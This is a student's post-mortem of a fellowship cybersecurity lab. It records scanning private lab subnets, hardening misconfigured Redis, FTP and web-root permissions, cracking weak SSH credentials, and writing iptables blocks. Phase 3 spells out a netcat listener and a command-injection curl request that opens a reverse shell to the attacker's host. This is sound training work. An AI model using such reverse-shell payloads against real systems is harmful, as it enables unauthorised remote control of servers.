# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Melakee Mekonnen
**Date:** May 28, 2026
**Repository:** https://github.com/melakemekonnen/[your-repo]
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
To start my reconnaissance, I ran a host discovery scan across the
172.100.0.0/24 subnet using nmap -sn, which identified four live
hosts — the gateway at 172.100.0.1 and three target servers at
.11, .12, and .13. I quickly learned that a default nmap scan was
not enough, because when I scanned 172.100.0.11 with only the top
1000 ports, nothing showed up. It was only after running a full port
scan with -p- that I found Redis 8.6.2 running on port 6379, which
is outside nmap's default scan range (Lyon, 2009). On 172.100.0.12
I found vsftpd 3.0.2 running on port 21 — an FTP service that had
no business being there. Server 172.100.0.13 was the most
interesting — a full scan showed zero open ports, which told me the
vulnerability was not network-facing at all and I would need to look
inside the container to find it.

### Breach Network — 172.80.0.0/24
Scanning the 172.80.0.0/24 subnet revealed one live host at
172.80.0.10 running OpenSSH 10.2 on port 22. That was the only
service running, which made it clear this was going to be a
credential attack — the SSH service was exposed with no additional
protections visible from the outside (Stuttard & Pinto, 2011). I
also noticed two wordlists in my home directory (passwords.txt and
wordlist.txt), which I combined into one list of nine unique
passwords to use with Hydra in Phase 2.

### Exploitation Network — 172.60.0.0/24
Reconnaissance on 172.60.0.0/24 was tricky because the capstone
container never fully deployed — the provisioning script failed to
create the capstone_net Docker network, so the container was stuck
in a Created state and I could not reach 172.60.0.10 at all. After
diagnosing the issue with docker inspect, I manually created the
network and rebuilt the container on dmz_net, which already had the
172.60.0.0/24 subnet. Once it was running, curl confirmed the web
app was live on port 80. Looking at the server source code revealed
a command injection vulnerability at the /exec?cmd= endpoint where
user input goes directly into subprocess.Popen() with no filtering.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
Redis 8.6.2 was running on port 6379 with zero authentication. I
confirmed this by running redis-cli ping inside the container and
getting PONG back with no password prompt. I also ran redis-cli
config get requirepass which returned an empty string — meaning
anyone on the network could connect and do anything to the database.

**Remediation Commands:**
docker exec -it broken_server_1 /bin/sh
redis-cli ping
redis-cli config get requirepass
redis-cli config set requirepass "TitanCorp2026!"
redis-cli ping

**Before State:**
redis-cli ping returned PONG immediately with no credentials.
redis-cli config get requirepass returned an empty value. The
database was completely open to anyone who could reach port 6379.

**After State:**
After setting the password, redis-cli ping returned "NOAUTH
Authentication required." Redis now rejects any connection that
does not provide the correct password first.

**Analysis:**
An unauthenticated Redis instance is one of the most dangerous
misconfigurations in a networked environment because Redis was
never designed to be publicly accessible without access controls
(Carlson, 2013). In a real enterprise setting, an attacker who
reaches port 6379 can read every key in the database, overwrite
data, or even use Redis CONFIG SET to write files to the filesystem
and potentially achieve remote code execution. Setting requirepass
is the minimum fix — ideally this gets combined with a firewall
rule that limits who can reach port 6379 at all.

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
An unauthorized FTP service (vsftpd 3.0.2) was running on port 21.
I confirmed it with ps aux | grep ftp which showed vsftpd running
as PID 48, and ss -tlnp which showed it listening on all interfaces
on port 21. There was no legitimate reason for FTP to be running
on this server.

**Remediation Commands:**
docker exec -it broken_server_2 /bin/sh
ps aux | grep -i ftp
ss -tlnp
kill -9 48

**Before State:**
ss -tlnp confirmed vsftpd listening on 0.0.0.0:21. ps aux showed
PID 1 running the startup script and PID 48 running the vsftpd
daemon. Port 21 was fully accessible from the network.

**After State:**
After kill -9 48, the container exited automatically because
vsftpd was its primary process. ss -tlnp and ps aux from the host
showed no FTP processes or port 21 listener remaining.

**Analysis:**
FTP sends everything in plaintext including credentials, making it
trivially interceptable on any network an attacker can access
(Forouzan, 2007). More concerning is that this was a rogue service
with no authorized purpose, which in a real investigation would be
treated as a potential indicator of compromise. When a service has
no legitimate business reason to exist, the right call is always
termination, not reconfiguration.

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
The /var/www/html directory had 777 permissions, meaning anyone
on the system could write files into the web root. I found this
by running find / -type d -perm -777 inside the container, which
returned /var/www/html alongside expected system directories like
/tmp. I was careful not to flag /tmp as a vulnerability since
world-writable /tmp is normal and intentional on Linux.

**Remediation Commands:**
docker exec -it broken_server_3 /bin/sh
find / -type d -perm -777 2>/dev/null
ls -la /var/www/
chmod 755 /var/www/html
ls -la /var/www/

**Before State:**
ls -la /var/www/ showed /var/www/html with permissions drwxrwxrwx
(777). Any user or process on the system could create, modify, or
delete files in the web root.

**After State:**
After running chmod 755 /var/www/html, permissions changed to
drwxr-xr-x. Only root can write to the directory now. Everyone
else gets read and execute only.

**Analysis:**
A world-writable web root is dangerous because it lets any
low-privileged attacker drop a web shell into the directory and
get remote code execution through the browser (OWASP, 2021). This
is one of the most common ways attackers establish persistence on
compromised web servers — the initial foothold might be small, but
a writable web root turns it into full control. Following the
principle of least privilege means write access to web-served
directories should belong only to root or a dedicated deployment
process, never to arbitrary users (NIST, 2020).

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: root
- Password: admin123

**Forensic Evidence:**
- Exact Timestamp of Successful Login: 2026-05-28 01:44:12 EDT
- Attacker IP Address: 172.80.0.1

**Engineered iptables Rule:**
iptables -A INPUT -s 172.80.0.1 -j DROP

**SOC Analysis:**
Blocking a single IP with iptables feels satisfying but it really
only stops the laziest attacker — anyone with access to a second
machine or a VPN can just come from a different IP and try again
(Cheswick et al., 2003). The deeper problem is that the root
account had a weak password in the first place, so the real fix
is enforcing strong credentials and adding multi-factor
authentication on SSH. A real SOC would also deploy fail2ban to
automatically block IPs after a set number of failed attempts,
configure SIEM alerts to flag brute-force patterns in real time,
and require key-based authentication instead of passwords for any
privileged SSH access.

---

## Phase 3: Full Spectrum

**Listener Configuration:**
I set up a netcat listener on my host machine using:
nc -lvnp 4444
This told netcat to listen (-l) on port 4444 (-p 4444) with
verbose output (-v) and no DNS resolution (-n), waiting for an
incoming reverse shell connection from the target.

**Reverse Shell Payload:**
curl "http://172.60.0.10/exec?cmd=nc%20-e%20/bin/sh%20172.60.0.1%204444"

**Command Injection Explanation:**
Command injection works by sneaking operating system commands into
input fields that the application passes to a shell without
checking them first (OWASP, 2021). This server is vulnerable
because the /exec?cmd= endpoint takes whatever comes after cmd=
in the URL and feeds it directly to Python's subprocess.Popen()
with shell=True — no validation, no authentication, nothing. The
shell=True part makes it especially bad because it means the shell
interprets the whole string, including special characters that
let you chain or redirect commands.

**Forensic Evidence:**
- Process ID (PID): 1
- User-Agent: curl/8.14.1

**Lockdown Command:**
iptables -A INPUT -p tcp --dport 80 -j DROP

**Final Analytical Paragraph:**
Going through this whole operation from both sides — scanning,
cracking, exploiting, then hardening — changed how I think about
security. When I was on the attacking side, every vulnerability I
found was something completely avoidable: Redis had no password,
SSH used a weak credential that showed up in a wordlist, and the
web app just ran whatever command you gave it. The single control
that would have stopped Phase 3 entirely is input validation on
the /exec endpoint — if the server had checked or rejected the
cmd parameter instead of running it blindly, there was no exploit
(Anderson, 2020). What this taught me is that attackers do not
need to be especially sophisticated when the basics are not covered.
Defense in depth matters because each layer — the firewall, the
IDS signature, the EDR policy, the secure code — independently
closes off a whole category of attack. If even one of those layers
had been in place at the right point in this operation, the kill
chain would have broken. That is the real lesson: you do not have
to stop everything, you just have to make the attacker's job hard
enough that they move on.

---

## References
Anderson, R. (2020). *Security engineering: A guide to building
dependable distributed systems* (3rd ed.). Wiley.

Carlson, J. (2013). *Redis in action*. Manning Publications.

Cheswick, W., Bellovin, S., & Rubin, A. (2003). *Firewalls and
internet security: Repelling the wily hacker* (2nd ed.).
Addison-Wesley.

Forouzan, B. (2007). *Data communications and networking*
(4th ed.). McGraw-Hill.

Hydra Project. (2024). *THC-Hydra: A fast and flexible online
password cracking tool*. https://github.com/vanhauser-thc/thc-hydra

Lyon, G. (2009). *Nmap network scanning: The official Nmap project
guide to network discovery and security scanning*. Insecure.com LLC.

NIST. (2020). *Security and privacy controls for information systems
and organizations* (SP 800-53 Rev. 5). National Institute of
Standards and Technology. https://doi.org/10.6028/NIST.SP.800-53r5

OWASP. (2021). *OWASP top ten*. https://owasp.org/Top10/

Stuttard, D., & Pinto, M. (2011). *The web application hacker's
handbook: Finding and exploiting security flaws* (2nd ed.). Wiley.